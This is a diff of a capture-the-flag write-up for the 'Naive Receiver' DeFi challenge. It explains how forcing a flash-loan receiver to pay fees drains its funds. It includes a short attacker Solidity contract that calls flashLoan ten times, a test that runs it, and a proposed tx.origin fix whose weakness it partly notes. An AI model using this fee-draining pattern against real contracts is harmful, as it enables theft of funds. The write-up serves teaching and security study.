@@ -27,13 +27,13 @@ function receiveEther(uint256 fee) public payable {
 }
 ```
 
-The first require makes this function only callable by the lending pool. Let us look at the signature of the `flashLoan` function in the `NaiveReceiverLenderPool` contract
+The first `require` makes this function only callable by the lending pool. This seems like putting trust on the lending pool, however we will see that is not the case. Let us have a look at the signature of the `flashLoan` function in the `NaiveReceiverLenderPool` contract
 
 ```solidity
 function flashLoan(address borrower, uint256 borrowAmount) external nonReentrant
 ```
 
-The fact that this function is `external` gives us the idea that if we trust the lending pool, nothing wrong should happen. However when calling this function from an external source passing the borrower parameter to be the addess of `FlashLoanReceiver`, the following function will be executed
+When calling this function from an external source and passing the borrower parameter to be the addess of `FlashLoanReceiver`, the following function will be executed
 
 ```solidity
 borrower.functionCallWithValue(
@@ -45,7 +45,7 @@ borrower.functionCallWithValue(
 );
 ```
 
-In this context, even if the external actor made this function to execute, `msg.sender` is the lending pool. Therefore `receiveEther` will execute without any issues.
+In this context, even if the external actor makes this function to execute, `msg.sender` is the lending pool itself. Therefore `receiveEther` will execute without any issues.
 
 This is exactly where the vulnerability can be exploited. Making an external call to the `flashLoan` function will force the `FlashLoanReceiver` contract to pay the fee for the loan. If we are able to call 10 times this `flashLoan` function, all funds of `FlashLoanReceiver` will be transferred to `NaiveReceiverLenderPool`. In order to do so in one transaction, we will deploy an `AttackerNaiveReceiver` contract.
 
@@ -61,13 +61,15 @@ interface ILenderPool{
 
 Then we create the attacker contract with a function that will execute 10 times in a row a flashloan for only 1 ether, each time getting 1 ether in fees being transferred to the `NaiveReceiverLenderPool` contract
 
+```solidity
 contract AttackerNaiveReceiver {
-function attack(address \_lenderPool, address \_naiveReceiver) public {
-for (uint i = 0; i < 10; i++) {
-ILenderPool(\_lenderPool).flashLoan(\_naiveReceiver, 1 ether);
+    function attack(address _lenderPool, address _naiveReceiver) public {
+        for (uint i = 0; i < 10; i++) {
+            ILenderPool(_lenderPool).flashLoan(_naiveReceiver, 1 ether);
+        }
+    }
 }
-}
-}
+```
 
 This contract is stored in [this file](./AttackerNaiveReceiver.sol).
 
@@ -86,3 +88,13 @@ it("Exploit", async function () {
   await attackerContract.attack(this.pool.address, this.receiver.address)
 })
 ```
+
+## Solving the issue with `tx.origin`
+
+We have seen that we should not always trust `msg.sender`. In order to solve the issue we need to make sure that the only user that can call the `flashLoan` function from the receiver contract is an address under the control of the receiver. We could store this address in the receiver contract as `admin` and add the following line after the first `require` in `receiveEther`
+
+```solidity
+require(tx.origin == admin, 'Only admin can initiate a flashLoan')
+```
+
+The parameter `tx.origin` corresponds to the address that initiate the transaction, and therefore the attack we perform before would not work from an arbitrary address. Special attention is needed in this case, because transactions initiated by the admin account are subject to be routed by malicious smart contracts in order to execute the `flashLoan` function.
